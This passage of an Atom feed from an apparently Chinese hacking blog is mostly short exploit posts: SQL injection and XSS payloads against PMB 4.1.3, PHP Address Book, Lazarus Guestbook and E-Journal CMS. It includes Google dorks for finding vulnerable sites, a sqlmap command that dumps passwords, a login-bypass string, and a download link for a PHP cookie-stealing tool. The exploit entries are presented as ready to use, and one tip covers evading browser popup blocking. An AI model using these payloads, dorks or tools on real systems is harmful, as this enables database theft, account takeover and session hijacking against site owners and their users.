    <link href="http://www.weshell.net/pmb-sql.html"/>
    <id>http://www.weshell.net/pmb-sql.html</id>
    <published>2015-01-03T13:17:16.000Z</published>
    <updated>2015-01-03T11:37:56.000Z</updated>
    <content type="html"><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：PMB4.1.3SQL注入漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：PMB4.1.3</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码：">利用代码：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-==== POC ====-</div><div class="line">谷歌语法：inurl:opac_css</div><div class="line">http://localhost/[PMB_PATH]/catalog.php?categ=isbd&id=9 [SQLI]</div><div class="line">Using SQLMAP :</div><div class="line">./sqlmap.py -u "http://localhost/[PMB_PATH]/catalog.php?categ=isbd&id=9" -p id --headers="Cookie: [VALID_USER_COOKIE]" --passwords</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[PMB 4.1.3 SQL注入漏洞以及漏洞利用方法]]>
    
    </summary>
    
      <category term="漏洞仓库" scheme="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PHP Address Book XSS/SQL注入漏洞]]></title>
    <link href="http://www.weshell.net/Address-Book-SQL.html"/>
    <id>http://www.weshell.net/Address-Book-SQL.html</id>
    <published>2015-01-03T13:17:16.000Z</published>
    <updated>2015-01-03T11:36:36.000Z</updated>
    <content type="html"><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：PHP-Address-Book-SQL注入漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：ALL</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[XSS]：">利用代码[XSS]：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://php-addressbook.sourceforge.net/demo/</div><div class="line">?group=customer<span class="tag">&lt;/<span class="title">option</span>&gt;</span><span class="tag">&lt;/<span class="title">select</span>&gt;</span><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">32</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>));</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/dhbyh4.jpg" alt="XSS构造"></p>
<h3 id="利用代码[SQL注入]">利用代码[SQL注入]</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">-------------------</div><div class="line">if ($id) {</div><div class="line"></div><div class="line">   $sql = "SELECT * FROM $base_from_where AND $table.id='$id'";</div><div class="line">   $result = mysql_query($sql, $db);</div><div class="line">   $r = mysql_fetch_array($result);</div><div class="line"></div><div class="line">   $resultsnumber = mysql_numrows($result);</div><div class="line">}</div><div class="line">--------------------</div><div class="line">POC</div><div class="line">http://php-addressbook.sourceforge.net/demo/view.php?id=1337' union select 1,2,3,4,version(),6,database(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+</div><div class="line">&gt;</div><div class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></div></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">username = ' or 1336%2B1=1337--%20</div><div class="line">password = any</div><div class="line">--------------------------------------------------------</div><div class="line">$urlun = strip_tags(substr($_REQUEST['username'],0,32));</div><div class="line"></div><div class="line">$urlpw = strip_tags(substr($_REQUEST['password'],0,32));</div><div class="line">$cleanpw = md5($urlpw);</div><div class="line"></div><div class="line">$sql="SELECT * FROM users WHERE username='$urlun' and password='$cleanpw'";</div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/2lncw3a.jpg" alt="SQL注入"></p>
]]></content>
    <summary type="html">
    <![CDATA[PHP Address Book SQL注入漏洞以及漏洞利用方法]]>
    
    </summary>
    
      <category term="漏洞仓库" scheme="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Lazarus Guestbook 1.22 XSS/SQL注入漏洞]]></title>
    <link href="http://www.weshell.net/Lazarus%20-Guestbook%20.html"/>
    <id>http://www.weshell.net/Lazarus -Guestbook .html</id>
    <published>2015-01-03T13:17:16.000Z</published>
    <updated>2015-01-03T11:07:18.000Z</updated>
    <content type="html"><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：LazarusGuestbook1.22XSS/SQL注入漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：LazarusGuestbook1.22</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码：">利用代码：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#P0c [1]: Get into code xss in the ad block box</div><div class="line"><span class="tag">&lt;<span class="title">textarea</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">id</span>=<span class="value">"ad_code"</span> <span class="attribute">name</span>=<span class="value">"ad_code"</span> <span class="attribute">wrap</span>=<span class="value">"virtual"</span> <span class="attribute">rows</span>=<span class="value">"14"</span> <span class="attribute">cols</span>=<span class="value">"41"</span>&gt;</span>CODE XSS<span class="tag">&lt;/<span class="title">textarea</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [2]: Get into code xss in the smile name box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">size</span>=<span class="value">"25"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">name</span>=<span class="value">"s_emotion"</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [3]: Get into code xss in the font style box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">maxlength</span>=<span class="value">"70"</span> <span class="attribute">size</span>=<span class="value">"38"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">name</span>=<span class="value">"font_face"</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [4]: Get into code xss in the security box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">size</span>=<span class="value">"29"</span> <span class="attribute">name</span>=<span class="value">"comment_pass"</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [5]: Get into code xss in the email notification box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">maxlength</span>=<span class="value">"60"</span> <span class="attribute">size</span>=<span class="value">"30"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">name</span>=<span class="value">"book_mail"</span>&gt;</span></div><div class="line"></div><div class="line">#P0c [6]: Get into code xss in the tags box</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">class</span>=<span class="value">"input"</span> <span class="attribute">maxlength</span>=<span class="value">"60"</span> <span class="attribute">size</span>=<span class="value">"30"</span> <span class="attribute">value</span>=<span class="value">"CODE XSS"</span> <span class="attribute">name</span>=<span class="value">"allowed_tags"</span>&gt;</span></div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/JESZTCz.jpg" alt="SQL注入漏洞"></p>
]]></content>
    <summary type="html">
    <![CDATA[Lazarus Guestbook 1.22 XSS/SQL注入漏洞以及漏洞利用方法]]>
    
    </summary>
    
      <category term="漏洞仓库" scheme="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[E-Journal CMS SQL注入漏洞]]></title>
    <link href="http://www.weshell.net/E-Journal%20-CMS-SQL%20.html"/>
    <id>http://www.weshell.net/E-Journal -CMS-SQL .html</id>
    <published>2015-01-03T13:17:16.000Z</published>
    <updated>2015-01-03T11:06:48.000Z</updated>
    <content type="html"><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：E-Journal-CMS-SQL注入漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：ALL</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[XSS]：">利用代码[XSS]：</h3>
<p>谷歌利用：<br>inurl:mahasiswa.php intitle:E-Journal<br>inurl:dosen.php intitle:E-Journal<br>inurl:jurnal.php intitle:E-Journal<br>inurl:dokumen.php intitle:E-Journal<br>“Karya Tulis Mahasiswa” intitle:E-Journal<br>“Design &amp; Programming by” intitle:E-Journal<br>“E-Journal adalah aplikasi berbasis web untuk” </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">POC#1: SQL Injection </div><div class="line">http://[Site]/[Path]/jurnal.php?detail=jurnal&id=-'[SQL-INJECTION VULNERABILITY]--</div><div class="line"> </div><div class="line">Reference Url(s): </div><div class="line">http://e-journal.xxx.ac.id/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div><div class="line">http://www.ejournal-xxx.com/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div><div class="line">http://e-journal.xxx.ac.id/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div><div class="line">http://ejurnal.xxx.ac.id/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div><div class="line">http://ejournal.xxx.ac.id/jurnal.php?detail=jurnal&id='133[SQL-INJECTION VULNERABILITY]--</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[E-Journal CMS SQL注入漏洞以及漏洞利用方法]]>
    
    </summary>
    
      <category term="漏洞仓库" scheme="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Hello World]]></title>
    <link href="http://www.weshell.net/hello-world.html"/>
    <id>http://www.weshell.net/hello-world.html</id>
    <published>2015-01-03T08:23:17.000Z</published>
    <updated>2015-01-03T04:06:16.000Z</updated>
    <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">trobuleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick_Start">Quick Start</h2>
<h3 id="Create_a_new_post">Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>

<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run_server">Run server</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>

<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate_static_files">Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>

<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy_to_remote_sites">Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>

<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[Cookie Manager 0.5 [cookie小偷]]]></title>
    <link href="http://www.weshell.net/cookie-manager.html"/>
    <id>http://www.weshell.net/cookie-manager.html</id>
    <published>2015-01-03T02:17:16.000Z</published>
    <updated>2015-01-03T10:07:06.000Z</updated>
    <content type="html"><![CDATA[<p>大家都懂的，构建完XSS后需要一个东西来收集cookie，<br>没有错这个就是php版的工具，源码已经打包<br>自行下载<br><a href="http://packetstorm.wowhacker.com/web/CookieStealer.zip" rel="external" target="_blank">撸这里下载</a></p>
]]></content>
    <summary type="html">
    <![CDATA[cookie小偷PHP源码]]>
    
    </summary>
    
      <category term="神兵利器" scheme="http://www.weshell.net/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[JavaScript禁止浏览器屏蔽window.open]]></title>
    <link href="http://www.weshell.net/javascript-show.html"/>
    <id>http://www.weshell.net/javascript-show.html</id>
    <published>2015-01-02T13:17:16.000Z</published>
    <updated>2015-01-09T06:36:32.000Z</updated>
    <content type="html"><![CDATA[<p>因为大部分浏览器都屏蔽掉了JS中的window.open，所以我们要想办法来突破阻止</p>
<p>在某些时候我们需要利用弹窗来显示一些信息，这个时候我们可以直接在JS中调用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.open(url,“_blank”,option);</div></pre></td></tr></table></figure>

<p>就可以完成跳转，而且还能传递我们需要的参数</p>
<p>但是有个问题是，很多浏览器不支持代码触发上述代码，这个问题在平常使用中显得很不方便，尤其是我们经常用ajax返回值来触发一个新页面。</p>
<p>为了防止被屏蔽，可以有两种方式解决。<br>1、在用户点击事件中增加监听程序</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">button</span> <span class="attribute">onclick</span>=<span class="value">“test()”</span>&gt;</span>点击<span class="tag">&lt;/<span class="title">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">“text</span>/<span class="attribute">javascript</span>”&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">var</span> is_finished=<span class="literal">false</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>{</div><div class="line">$.get(“/”,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>{</div><div class="line">is_finished=<span class="literal">true</span>;</div><div class="line">});</div><div class="line">test2();</div><div class="line">}</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test2</span><span class="params">()</span></span>{</div><div class="line"><span class="keyword">if</span>(is_finished){</div><div class="line"><span class="built_in">window</span>.open(“http:<span class="comment">//www.baidu.com”,“_blank”);</span></div><div class="line">}<span class="keyword">else</span>{</div><div class="line">setTimeout(test2,<span class="number">1000</span>);</div><div class="line">}</div><div class="line">}</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

<p>2、在点击后先打开空白页，之后再修改地址</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">button</span> <span class="attribute">onclick</span>=<span class="value">“test()”</span>&gt;</span>点击<span class="tag">&lt;/<span class="title">button</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">“text</span>/<span class="attribute">javascript</span>”&gt;</span><span class="javascript"></span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>{</div><div class="line"><span class="keyword">var</span> frame=<span class="built_in">window</span>.open(“about:blank”,“_blank”);</div><div class="line">$.get(“/”,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>{</div><div class="line">frame.location=“http:<span class="comment">//www.baidu.com”;</span></div><div class="line">});</div><div class="line">}</div><div class="line"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[因为大部分浏览器都屏蔽掉了JS中的window.open，所以我们要想办法来突破阻止]]>
    
    </summary>
    
      <category term="技术文章" scheme="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
</feed>
